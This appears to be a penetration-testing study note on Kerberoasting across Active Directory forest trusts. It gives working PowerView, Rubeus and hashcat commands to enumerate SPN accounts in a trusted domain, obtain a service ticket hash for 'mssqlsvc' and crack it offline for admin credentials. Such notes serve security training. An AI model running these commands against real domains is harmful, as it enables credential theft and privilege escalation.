# Attacking Domain Trusts - Cross-Forest Trust Abuse 🖥️ - From Windows
Kerberos-based attacks—such as **Kerberoasting** and ASREPRoasting—can be executed across domain or forest trusts, depending on the trust direction.
If you're operating within a domain that has an inbound or **bidirectional** trust with another domain or forest, you may be able to leverage that trust to launch attacks in the trusted domain.
In some cases, privilege escalation within your current domain may not be possible. However, you might still be able to request a **Kerberos service ticket (TGS)** for an administrative account in the trusted domain. Once obtained, the ticket hash can be cracked offline, potentially giving you credentials for a user with Domain Admin or Enterprise Admin privileges across both domains—thus giving you a powerful foothold.
### Enumerating accounts in a target domain that have SPNs associated with them Using PowerView:
```powershell
Get-DomainUser -SPN -Domain <TargetDomain> | select SamAccountName
```
<img width="1504" height="250" alt="image" src="https://github.com/user-attachments/assets/2b1e92aa-f4e3-4616-8dfb-30e06c4dcead" />
### Enumerating the mssqlsvc Account
<img width="1657" height="214" alt="image" src="https://github.com/user-attachments/assets/245a75ee-1096-45f8-ac13-d30a16462bc1" />
### Perform a Kerberoasting attack across the trust using Rubeus
```powershell
.\Rubeus.exe kerberoast /domain:DOM.LOCAL /user:mssqlsvc /nowrap
```
<img width="1632" height="370" alt="image" src="https://github.com/user-attachments/assets/64e77fda-8e07-4293-9f20-9edf86448206" />
Copy the Hash on Kali-Machine

### Crack the hashes
```shell
sudo hashcat -m 13100 hash.hash /usr/share/wordlists/rockyou.txt
```

